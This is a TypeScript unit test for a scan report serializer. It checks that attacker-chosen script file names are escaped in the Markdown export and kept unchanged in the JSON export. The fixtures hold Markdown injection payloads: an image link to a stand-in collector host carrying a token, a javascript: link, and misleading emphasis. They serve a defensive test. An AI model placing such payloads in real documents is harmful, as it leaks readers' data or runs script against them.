import assert from 'node:assert/strict';
import {test} from 'node:test';
import {serializeDomBatchReport} from '../src/dom-report.ts';
import type {BatchDomResult} from '../../scan-service/src/batch-dom.ts';

test('RG-07 DOM Markdown export keeps untrusted script basenames inert without altering JSON evidence',()=>{
 const names=[
  '![PREVIEW](https:collector.invalid?token=SECRET).user.js',
  '[REPAIR](javascript:alert(1)).user.js',
  '*MISLEADING_RESULT*.user.js',
 ];
 const report:BatchDomResult={
  validationLevel:'dom-only',
  pageTargetId:'synthetic-target',
  pageUrl:'https://example.invalid/fixture?token=SECRET',
  pageDocumentToken:'a'.repeat(64),
  totalItems:names.length,
  items:names.map((name,index)=>({
   index,scriptId:'synthetic-'+index,path:'/synthetic/'+name,
   status:'dom-present' as const,checked:1,found:1,missing:0,needsReview:0,
   reason:'synthetic-only',
   verification:{V0:'passed' as const,V1:'passed' as const,V2:'blocked' as const,
    V3:'not-configured' as const,V4:'not-configured' as const,
    highestVerified:'V1' as const,functionalVerified:false,managerVerified:false},
  })),
 };
 const exported=serializeDomBatchReport(report,'markdown','2026-10-13T06:00:00.000Z');
 assert.doesNotMatch(exported,/\|\s*!\[PREVIEW\]\(/,
  'do not render the basename as an external Markdown image');
 assert.doesNotMatch(exported,/\|\s*\[REPAIR\]\(javascript:/,
  'do not render a clickable scripted Markdown link');
 assert.doesNotMatch(exported,/\|\s*\*MISLEADING_RESULT\*/,
  'do not render attacker-selected emphasis as report formatting');
 assert.match(exported,/\\!\\\[PREVIEW\\\]\\\(/);
 assert.match(exported,/\\\[REPAIR\\\]\\\(javascript:/);
 assert.match(exported,/\\\*MISLEADING\\_RESULT\\\*/);
 assert.doesNotMatch(exported,/token=SECRET\//,
  'report must not include the original page URL or query token');
 const json=JSON.parse(serializeDomBatchReport(report,'json','2026-10-13T06:00:00.000Z'));
 assert.deepEqual(json.items.map((row:{name:string})=>row.name),names);
 assert.equal(json.items.every((row:{verification:{V1:string,V3:string,V4:string}})=>
  row.verification.V1==='passed'&&row.verification.V3==='not-configured'&&
  row.verification.V4==='not-configured'),true);
});
